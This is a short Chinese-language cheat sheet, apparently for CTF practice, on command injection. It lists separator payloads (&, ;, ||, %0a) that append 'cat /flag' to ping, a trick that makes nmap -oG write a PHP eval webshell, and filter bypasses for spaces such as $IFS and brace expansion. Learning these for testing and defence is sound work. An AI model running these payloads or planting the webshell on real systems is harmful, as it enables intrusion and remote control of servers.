## **0x00.远程命令执行**

应用程序会调用系统的命令函数，当攻击者可以控制这些函数的参数时，就可以把恶意命令拼接到正常命令中，从而造成远程命令执行漏洞

1. 命令注入漏洞产生的原因
```
1、用户可以控制输入的内容
2、用户输入的内容被当作命令执行
```
2. 漏洞产生位置
```
危险函数命令拼接
curl
ping
wget

注意filename参数
可能是命令执行，如mkdir，rm
```

## **命令分隔符**
```

& 前后命令同时进行
ping -c 2 127.0.0.1 & cat /flag
ping -c 2 127.0.0.1 & cat flag.php  

;  先前后后命令都执行
ping -c 2 127.0.0.1 ; cat flag.php  

&& 前面成功，后面才执行

| 管道符，前面结果作为后面的参数

|| 前面失败，后面才执行
可以用于绕过后面有限制的命令
cat flag.php || >/dev/null 2>&1
后面命令表示不回显，不能让后面的命令执行。

还可以命令截断：?c=cat flag.php%0a  也不让后面命令执行
但是在ubuntu中，%0a反而可以作为命令拼接，执行%0a（换行）后的命令


namp参数写文件webshell
?host=' <?php @eval($_POST["cmd"]);?> -oG test.php '
或直接读
?host=' <?php echo `cat /flag`;?> -oG test.php '

?host=' <?= @eval($_POST[1]);?> -oG a.phtml '
```



## **0x02.空格绕过**
网站过滤了空格，命令中不能出现空格。
在bash下可以用$IFS、${IFS}、$IFS$9、%09、<、>、<>、{}(例如{cat,/etc/passwd}）、%20(space)、%09(tab)，这儿跟sql注入Q有点相似，用/**/注释也能绕过。
```
1. 使用linux下的分割符变量替换空格：
$IFS   =  ${IFS}    $IFS$1
如：cat$IFS$1/flag

2.替换无空格命令
{cat,/flag}

3.替换无空格命令
cat</flag
curl<flag 

4.cat%09/flag
%09 table符url编码，有可能绕过白名单了会再解码一次。
```
ubuntu的sh貌似不能用$IFS，用<等。
但是在ubuntu中，%0a反而可以作为命令拼接，执行%0a（换行）后的命令。
